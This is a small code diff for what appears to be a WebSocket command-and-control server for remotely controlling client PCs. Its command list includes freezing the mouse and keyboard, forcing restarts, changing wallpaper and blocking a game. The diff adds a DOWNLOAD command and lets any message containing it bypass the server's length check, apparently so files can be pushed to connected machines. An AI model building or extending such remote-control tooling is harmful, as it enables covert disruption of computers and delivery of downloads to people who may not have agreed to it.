@@ -20,7 +20,7 @@ setInterval(() => {
   }
 }, 5000);
 
-const knownCommands = ["FREEZE_MOUSE", "UNFREEZE_MOUSE", "FREEZE_KEYBOARD", "LIST_CLIENTS", "UNFREEZE_KEYBOARD", "IMAGE", "CALCULATOR", "SAFE_RESTART", "FORCE_RESTART", "AUDIO", "COOK_PC_UI", "CHANGE_WALLPAPER", "BLOCK_VALORANT", "UNBLOCK_VALORANT", "BYE"]; // ! TEXT_ IS A SPECIAL COMMAND
+const knownCommands = ["FREEZE_MOUSE", "UNFREEZE_MOUSE", "FREEZE_KEYBOARD", "LIST_CLIENTS", "UNFREEZE_KEYBOARD", "IMAGE", "CALCULATOR", "SAFE_RESTART", "FORCE_RESTART", "AUDIO", "COOK_PC_UI", "CHANGE_WALLPAPER", "BLOCK_VALORANT", "UNBLOCK_VALORANT", "DOWNLOAD", "BYE"]; // ! TEXT_ IS A SPECIAL COMMAND
 const knownSpecialCommands = ["ALL"];
 
 wss.on("connection", (socket) => {
@@ -82,7 +82,7 @@ wss.on("connection", (socket) => {
       socket.send(response || "NO_CLIENTS");
       return;
     } else if (msg.includes("|")) {
-      if (msg.length <= 80)
+      if (msg.includes("DOWNLOAD") || msg.length <= 80)
         console.log(`Received: [${msg}] from an ADM.`);
       else {
         console.log("Message too big, rejecting...");
